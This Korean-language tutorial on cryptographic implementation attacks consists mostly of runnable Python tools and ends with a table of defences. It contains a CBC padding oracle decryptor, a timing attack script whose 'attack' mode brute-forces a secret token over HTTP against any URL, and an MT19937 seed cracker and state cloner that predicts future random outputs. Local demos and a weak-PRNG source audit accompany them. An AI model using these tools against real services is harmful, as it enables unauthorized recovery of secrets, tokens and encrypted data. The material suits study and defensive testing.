# 암호화 구현 취약점 공격 — 패딩 오라클·타이밍 공격·약한 난수

## 1. 암호화 구현 취약점 분류

```
암호 알고리즘 자체 약점
    │  → 약한 키 길이, 취약한 알고리즘 (DES, RC4, MD5)
    ▼
구현 취약점
    │  → 패딩 오라클, IV 재사용, ECB 모드 사용
    ▼
사이드 채널 공격
    │  → 타이밍 공격, 캐시 타이밍, 전력 분석
    ▼
프로토콜 취약점
    │  → BEAST, POODLE, CRIME, LUCKY13
    ▼
난수 생성기 약점
    │  → 약한 시드, 예측 가능한 출력
```

---

## 2. 패딩 오라클 공격

```python
#!/usr/bin/env python3
"""CBC 패딩 오라클 공격 — 암호문 복호화 자동화."""

import argparse
import json
from typing import Callable


def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def pkcs7_unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    if pad_len == 0 or pad_len > 16:
        raise ValueError("유효하지 않은 패딩")
    if data[-pad_len:] != bytes([pad_len] * pad_len):
        raise ValueError("패딩 검증 실패")
    return data[:-pad_len]


class PaddingOracleAttack:
    """
    CBC 패딩 오라클 공격 구현.

    oracle_fn: 패딩이 유효한지 여부를 반환하는 콜백
    block_size: 암호 블록 크기 (기본 16바이트)
    """

    def __init__(
        self,
        oracle_fn: Callable[[bytes, bytes], bool],
        block_size: int = 16,
    ) -> None:
        self.oracle = oracle_fn
        self.block_size = block_size

    def decrypt_block(self, prev_block: bytes, target_block: bytes) -> bytes:
        """target_block 단일 블록 복호화."""
        bs = self.block_size
        intermediate = bytearray(bs)

        for byte_idx in range(bs - 1, -1, -1):
            pad_val = bs - byte_idx
            found = False

            for guess in range(256):
                # 수정된 이전 블록 구성
                modified = bytearray(bs)
                for i in range(byte_idx + 1, bs):
                    modified[i] = intermediate[i] ^ pad_val
                modified[byte_idx] = guess

                if self.oracle(bytes(modified), target_block):
                    # intermediate[byte_idx] = guess ^ pad_val
                    intermediate[byte_idx] = guess ^ pad_val
                    found = True
                    break

            if not found:
                raise RuntimeError(f"바이트 {byte_idx} 복호화 실패")

        # plaintext = intermediate XOR prev_block
        return xor_bytes(bytes(intermediate), prev_block)

    def decrypt(self, iv: bytes, ciphertext: bytes) -> bytes:
        """전체 암호문 복호화."""
        bs = self.block_size
        if len(ciphertext) % bs != 0:
            raise ValueError("암호문이 블록 크기 배수가 아님")

        blocks = [iv] + [ciphertext[i:i+bs] for i in range(0, len(ciphertext), bs)]
        plaintext = b""

        for i in range(1, len(blocks)):
            block_plain = self.decrypt_block(blocks[i - 1], blocks[i])
            plaintext += block_plain
            print(f"[*] 블록 {i}/{len(blocks)-1} 복호화 완료")

        # PKCS7 패딩 제거
        try:
            return pkcs7_unpad(plaintext)
        except ValueError:
            return plaintext  # 패딩 없는 경우


def simulate_oracle(key: bytes) -> Callable[[bytes, bytes], bool]:
    """데모용 오라클: AES-CBC 패딩 검증 시뮬레이션."""
    from Crypto.Cipher import AES

    def oracle(prev_block: bytes, target_block: bytes) -> bool:
        cipher = AES.new(key, AES.MODE_CBC, iv=prev_block)
        plaintext = cipher.decrypt(target_block)
        pad_byte = plaintext[-1]
        return (
            1 <= pad_byte <= 16
            and plaintext[-pad_byte:] == bytes([pad_byte] * pad_byte)
        )

    return oracle


def main() -> None:
    parser = argparse.ArgumentParser(description="CBC 패딩 오라클 공격 데모")
    parser.add_argument("--demo", action="store_true", help="내장 데모 실행")
    parser.add_argument("--iv", help="IV (hex)")
    parser.add_argument("--ciphertext", help="암호문 (hex)")
    args = parser.parse_args()

    if args.demo:
        from Crypto.Cipher import AES
        from Crypto.Random import get_random_bytes
        from Crypto.Util.Padding import pad

        key = get_random_bytes(16)
        iv = get_random_bytes(16)
        plaintext = b"SECRET_PASSWORD!"
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        ciphertext = cipher.encrypt(pad(plaintext, 16))

        print(f"[*] 원문: {plaintext}")
        print(f"[*] IV: {iv.hex()}")
        print(f"[*] 암호문: {ciphertext.hex()}")

        oracle = simulate_oracle(key)
        attack = PaddingOracleAttack(oracle)
        recovered = attack.decrypt(iv, ciphertext)
        print(f"\n[+] 복호화 결과: {recovered}")
        assert recovered == plaintext, "복호화 실패"
        print("[+] 검증 성공!")

    elif args.iv and args.ciphertext:
        print("[!] 실제 오라클 함수를 oracle_fn 파라미터로 제공해야 함")
        print("    코드 내 simulate_oracle을 실제 구현으로 교체 후 사용")
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

---

## 3. 타이밍 공격

```python
#!/usr/bin/env python3
"""타이밍 공격 — HMAC 비교·패스워드 검증 취약점 탐지."""

import argparse
import statistics
import time
from typing import Callable
import httpx


def measure_response_time(
    fn: Callable[[], None],
    iterations: int = 100,
) -> tuple[float, float]:
    """함수 실행 시간 측정 (평균, 표준편차)."""
    times = []
    for _ in range(iterations):
        start = time.perf_counter_ns()
        fn()
        elapsed = time.perf_counter_ns() - start
        times.append(elapsed)
    return statistics.mean(times), statistics.stdev(times)


def timing_attack_local(
    compare_fn: Callable[[str], bool],
    charset: str = "abcdefghijklmnopqrstuvwxyz0123456789",
    max_length: int = 8,
    iterations: int = 200,
) -> str:
    """
    타이밍 공격으로 비밀값 복구.
    compare_fn: 추측값이 맞으면 True 반환 (타이밍 차이 있는 비교 함수)
    """
    known = ""

    for pos in range(max_length):
        best_char = ""
        best_time = 0.0

        for char in charset:
            candidate = known + char + "a" * (max_length - pos - 1)
            mean_time, _ = measure_response_time(
                lambda c=candidate: compare_fn(c), iterations
            )
            if mean_time > best_time:
                best_time = mean_time
                best_char = char

        known += best_char
        print(f"[*] 위치 {pos}: {best_char} (평균 {best_time:.0f}ns) → {known}")

        # 실제 매칭 확인
        if compare_fn(known.rstrip("a")):
            print(f"[+] 발견: {known.rstrip('a')}")
            return known.rstrip("a")

    return known


def test_remote_timing(
    url: str,
    param: str,
    charset: str,
    iterations: int = 50,
) -> None:
    """원격 엔드포인트 타이밍 공격 (HTTP)."""
    print(f"[*] 타이밍 공격: {url}")
    known = ""

    for pos in range(20):
        best_char = ""
        best_time = 0.0

        for char in charset:
            candidate = known + char

            times = []
            for _ in range(iterations):
                try:
                    start = time.perf_counter_ns()
                    httpx.post(url, data={param: candidate}, timeout=5.0)
                    elapsed = time.perf_counter_ns() - start
                    times.append(elapsed)
                except httpx.RequestError:
                    pass

            if times:
                mean_t = statistics.mean(times)
                if mean_t > best_time:
                    best_time = mean_t
                    best_char = char

        if not best_char:
            break

        known += best_char
        print(f"[*] 위치 {pos}: {best_char} (avg {best_time/1e6:.2f}ms) → 현재: {known}")


def detect_timing_vulnerability(url: str, param: str) -> None:
    """타이밍 취약점 존재 여부 검사."""
    print(f"[*] 타이밍 취약점 검사: {url}")
    correct_prefix = "a"
    wrong_prefix = "z" * 10

    correct_times = []
    wrong_times = []

    for _ in range(30):
        try:
            t0 = time.perf_counter_ns()
            httpx.post(url, data={param: correct_prefix}, timeout=5.0)
            correct_times.append(time.perf_counter_ns() - t0)

            t0 = time.perf_counter_ns()
            httpx.post(url, data={param: wrong_prefix}, timeout=5.0)
            wrong_times.append(time.perf_counter_ns() - t0)
        except httpx.RequestError:
            pass

    if not correct_times or not wrong_times:
        print("[-] 응답 없음")
        return

    diff = abs(statistics.mean(correct_times) - statistics.mean(wrong_times))
    threshold = 500_000  # 0.5ms

    print(f"    정상 prefix 평균: {statistics.mean(correct_times)/1e6:.3f}ms")
    print(f"    오류 prefix 평균: {statistics.mean(wrong_times)/1e6:.3f}ms")
    print(f"    차이: {diff/1e6:.3f}ms")

    if diff > threshold:
        print("[!] 타이밍 취약점 의심! 차이가 임계값({:.1f}ms) 초과".format(threshold/1e6))
    else:
        print("[+] 타이밍 차이 미미 — 안전한 비교 함수 사용 가능성 높음")


def main() -> None:
    parser = argparse.ArgumentParser(description="타이밍 공격 도구")
    sub = parser.add_subparsers(dest="cmd", required=True)

    detect_p = sub.add_parser("detect", help="타이밍 취약점 탐지")
    detect_p.add_argument("url")
    detect_p.add_argument("--param", default="token")

    attack_p = sub.add_parser("attack", help="원격 타이밍 공격")
    attack_p.add_argument("url")
    attack_p.add_argument("--param", default="token")
    attack_p.add_argument("--charset", default="abcdefghijklmnopqrstuvwxyz0123456789")
    attack_p.add_argument("--iterations", type=int, default=50)

    local_p = sub.add_parser("local-demo", help="로컬 타이밍 공격 데모")

    args = parser.parse_args()

    match args.cmd:
        case "detect":
            detect_timing_vulnerability(args.url, args.param)
        case "attack":
            test_remote_timing(args.url, args.param, args.charset, args.iterations)
        case "local-demo":
            secret = "secret42"

            def vulnerable_compare(guess: str) -> bool:
                for i, (a, b) in enumerate(zip(guess, secret)):
                    if a != b:
                        return False
                    time.sleep(0.0001)  # 의도적 타이밍 차이
                return len(guess) == len(secret)

            result = timing_attack_local(vulnerable_compare, max_length=len(secret))
            print(f"\n[+] 타이밍 공격 결과: {result}")


if __name__ == "__main__":
    main()
```

---

## 4. 약한 난수 생성기 공격

```python
#!/usr/bin/env python3
"""약한 PRNG 탐지 및 예측 공격 — MT19937 역산."""

import argparse
import random
import struct
import time
from pathlib import Path


def crack_mt19937_seed_time(
    observed_value: int,
    time_window: int = 1000,
) -> int | None:
    """현재 시각 기반 시드 brute-force."""
    now = int(time.time())
    for seed in range(now - time_window, now + 1):
        r = random.Random(seed)
        if r.getrandbits(32) == observed_value:
            return seed
    return None


def clone_mt19937(outputs: list[int]) -> random.Random:
    """
    MT19937 상태 역산 — 624개의 32비트 출력으로 상태 복원.
    outputs: getrandbits(32)로 수집한 624개 값
    """
    if len(outputs) < 624:
        raise ValueError(f"624개 출력 필요 (현재 {len(outputs)}개)")

    def untemper(y: int) -> int:
        # MT19937 temper 역산
        y ^= (y >> 18)
        y ^= (y << 15) & 0xEFC60000

        # 왼쪽 시프트 역산
        tmp = y ^ ((y << 7) & 0x9D2C5680)
        tmp = y ^ ((tmp << 7) & 0x9D2C5680)
        tmp = y ^ ((tmp << 7) & 0x9D2C5680)
        tmp = y ^ ((tmp << 7) & 0x9D2C5680)
        y = y ^ ((tmp << 7) & 0x9D2C5680)

        # 오른쪽 시프트 역산
        tmp = y ^ (y >> 11)
        tmp = y ^ (tmp >> 11)
        y = y ^ (tmp >> 11)

        return y & 0xFFFFFFFF

    state = [untemper(v) for v in outputs[:624]]

    # Python random 내부 상태 주입
    cloned = random.Random()
    mt_state = tuple(state + [624])
    cloned.setstate((3, mt_state, None))
    return cloned


def audit_prng_usage(source_file: Path) -> list[dict]:
    """소스 코드에서 약한 PRNG 사용 탐지."""
    import re

    WEAK_PATTERNS = [
        (r"\brandom\.random\(\)", "random.random() — 암호화 목적 부적합"),
        (r"\brandom\.randint\(", "random.randint() — 암호화 목적 부적합"),
        (r"\brandom\.choice\(", "random.choice() — 토큰 생성에 부적합"),
        (r"\bMath\.random\(\)", "Math.random() — 예측 가능"),
        (r"\bsrand\s*\(", "srand() — 약한 C 난수"),
        (r"\btime\(\)\s*as\s*seed", "시각 기반 시드 — 예측 가능"),
        (r"seed\s*=\s*\d+", "하드코딩된 시드"),
    ]

    findings = []
    content = source_file.read_text(errors="ignore")
    lines = content.splitlines()

    for lineno, line in enumerate(lines, 1):
        for pattern, description in WEAK_PATTERNS:
            if re.search(pattern, line):
                findings.append({
                    "file": str(source_file),
                    "line": lineno,
                    "code": line.strip(),
                    "issue": description,
                    "recommendation": "secrets 모듈 또는 os.urandom() 사용",
                })

    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="약한 PRNG 탐지 및 공격")
    sub = parser.add_subparsers(dest="cmd", required=True)

    seed_p = sub.add_parser("crack-seed", help="시각 기반 시드 크랙")
    seed_p.add_argument("value", type=lambda x: int(x, 16), help="관측된 난수 값 (hex)")
    seed_p.add_argument("--window", type=int, default=1000)

    clone_p = sub.add_parser("clone", help="MT19937 상태 복제")
    clone_p.add_argument("--outputs", type=Path, help="32비트 출력 목록 파일 (각 줄에 hex)")

    audit_p = sub.add_parser("audit", help="소스 코드 PRNG 감사")
    audit_p.add_argument("path", type=Path)

    args = parser.parse_args()

    match args.cmd:
        case "crack-seed":
            print(f"[*] 시드 크랙 시도: 관측값={hex(args.value)}")
            seed = crack_mt19937_seed_time(args.value, args.window)
            if seed:
                print(f"[+] 시드 발견: {seed}")
            else:
                print("[-] 시드 탐지 실패")

        case "clone":
            if not args.outputs:
                print("[*] MT19937 복제 데모 (624개 랜덤값 수집 시뮬레이션)")
                target = random.Random()
                outputs = [target.getrandbits(32) for _ in range(624)]
                cloned = clone_mt19937(outputs)
                orig = [target.getrandbits(32) for _ in range(10)]
                pred = [cloned.getrandbits(32) for _ in range(10)]
                print(f"원본 다음 값: {[hex(v) for v in orig]}")
                print(f"예측 값:      {[hex(v) for v in pred]}")
                print(f"[+] 예측 {'성공' if orig == pred else '실패'}")
            else:
                vals = [int(l.strip(), 16) for l in args.outputs.read_text().splitlines() if l.strip()]
                cloned = clone_mt19937(vals)
                print(f"[+] 복제 완료. 다음 10개 예측값:")
                for i in range(10):
                    print(f"  {hex(cloned.getrandbits(32))}")

        case "audit":
            files = list(args.path.rglob("*.py")) if args.path.is_dir() else [args.path]
            total = []
            for f in files:
                total.extend(audit_prng_usage(f))
            if total:
                print(f"[!] 약한 PRNG 사용 {len(total)}개 발견:")
                for item in total:
                    print(f"\n  {item['file']}:{item['line']}")
                    print(f"  코드: {item['code']}")
                    print(f"  문제: {item['issue']}")
            else:
                print("[+] 약한 PRNG 사용 미발견")


if __name__ == "__main__":
    main()
```

---

## 5. 암호화 취약점 요약

| 공격 | 조건 | 영향 | 대응 |
|------|------|------|------|
| 패딩 오라클 | CBC + 패딩 오류 응답 차이 | 복호화 | AES-GCM 사용, 오류 메시지 통일 |
| ECB 블록 분석 | ECB 모드 사용 | 패턴 노출 | CBC/GCM으로 전환 |
| IV 재사용 | 같은 IV + 키 반복 | 평문 XOR 노출 | 무작위 IV 생성 |
| 타이밍 공격 | 비상수 시간 비교 | 시크릿 복구 | `hmac.compare_digest()` 사용 |
| MT19937 예측 | 624개 출력 수집 | 난수 예측 | `secrets` 모듈 사용 |
| 시각 기반 시드 | 생성 시각 추정 가능 | 시드 크랙 | `os.urandom()` 시드 사용 |
